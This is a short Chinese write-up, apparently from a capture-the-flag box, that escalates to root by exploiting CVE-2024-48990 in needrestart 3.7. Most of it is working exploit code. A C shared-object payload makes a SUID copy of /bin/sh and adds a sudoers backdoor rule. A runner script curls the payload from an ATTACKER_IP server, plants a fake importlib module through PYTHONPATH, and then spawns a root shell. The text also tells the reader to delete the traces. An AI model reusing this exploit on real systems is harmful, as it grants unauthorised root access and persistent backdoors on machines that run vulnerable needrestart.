提权看看这个needrestart的版本
fismathack@conversor:~$ sudo /usr/sbin/needrestart -v[main] eval /etc/needrestart/needrestart.conf[main] needrestart v3.7
3.7的版本，有个CVE-2024-48990在kali上写一个lib.c
/* lib.c - Our malicious shared object */#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;/* This is a GCC attribute that marks &#x27;a()&#x27; as a constructor. *//* This function will run AUTOMATICALLY when the library is loaded. */static void a() __attribute__((constructor));void a() &#123;    /* Only run if we are root */    if(geteuid() == 0) &#123;         setuid(0);        setgid(0);                /* The payload:           1. Copy the bash shell to /tmp/poc           2. Make /tmp/poc a SUID binary (owned by root, runs as root)           3. Add a sudoers rule as a backup persistence method        */        const char *shell = &quot;cp /bin/sh /tmp/poc; &quot;                            &quot;chmod u+s /tmp/poc; &quot;                            &quot;grep -qxF &#x27;ALL ALL=(ALL) NOPASSWD: /tmp/poc&#x27; /etc/sudoers || &quot;                            &quot;echo &#x27;ALL ALL=(ALL) NOPASSWD: /tmp/poc&#x27; &gt;&gt; /etc/sudoers&quot;;        system(shell);    &#125;&#125;
因为目标是 x86_64 Linux。我们需要编译 lib.c 为 64 位共享对象 （ .so ） 文件
gcc -shared -fPIC -o __init__.so lib.c
下面是触发脚本runner.sh：
#!/bin/bashset -ecd /tmp# 1. Create the malicious module directory structuremkdir -p malicious/importlib# 2. Download our compiled C payload from our attacker servercurl http://&lt;ATTACKER_IP&gt;:8000/__init__.so -o /tmp/malicious/importlib/__init__.so# 3. Create the &quot;bait&quot; Python script (e.py)cat &gt; /tmp/malicious/e.py &lt;&lt;&#x27;EOF&#x27;import timeimport oswhile True:    try:        import importlib    except:        pass        if os.path.exists(&quot;/tmp/poc&quot;):        print(&quot;Got shell!, delete traces in /tmp/poc, /tmp/malicious&quot;)        os.system(&quot;sudo /tmp/poc -p&quot;)        break    time.sleep(1)EOF# 4. Run the bait processecho &quot;Bait process is running. Trigger &#x27;sudo /usr/sbin/needrestart&#x27; in another shell.&quot;cd /tmp/maliciousPYTHONPATH=&quot;$PWD&quot; python3 e.py 2&gt;/dev/null
在kali上把8000端口打开，在已经ssh连接上的victom终端中输入
wget http://ip:8000/runner.shchmod +x runner.sh./runner.sh
